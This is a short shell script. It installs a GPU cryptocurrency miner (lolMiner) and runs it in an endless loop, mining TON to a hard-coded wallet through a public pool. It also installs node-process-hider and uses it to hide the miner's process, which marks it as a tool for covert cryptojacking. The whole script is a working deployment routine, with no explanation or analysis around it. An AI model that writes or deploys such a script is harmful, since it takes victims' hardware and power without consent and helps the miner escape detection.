#!/bin/sh
sudo apt update
sudo apt install screen -y
screen -dmS gpu.sh ./gpu.sh 79 95
sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add lolMiner
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.41/lolMiner_v1.41b_Lin64.tar.gz && tar xvf lolMiner_v1.41b_Lin64.tar.gz && mv 1.41b mng && cd mng && chmod +x lolMiner
while [ 1 ]; do
./lolMiner --algo TON --pool https://pool.services.tonwhales.com --user EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi
sleep 5

done
